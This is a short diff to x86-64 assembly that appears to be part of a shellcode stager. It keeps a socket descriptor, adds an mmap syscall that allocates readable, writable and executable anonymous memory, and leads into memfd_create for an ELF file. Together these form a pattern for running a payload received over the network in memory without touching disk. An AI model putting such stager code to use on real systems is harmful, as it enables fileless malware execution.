@@ -1,10 +1,16 @@
     push rdi                    ; save sockfd
     pop r13 
+    xor rdi, rdi                ; address
     mov rsi, %v  ; length
+    mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
+    mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS
+    xor r8, r8                  ; fd
+    xor r9, r9                  ; offset
+    mov rax, 0x9                ; mmap
+    syscall
+    
     push rsi ; save file length
     pop r12
-    nop
-    nop
     ; Create file descriptor for ELF file
     ;
     ; int memfd_create("", 0);
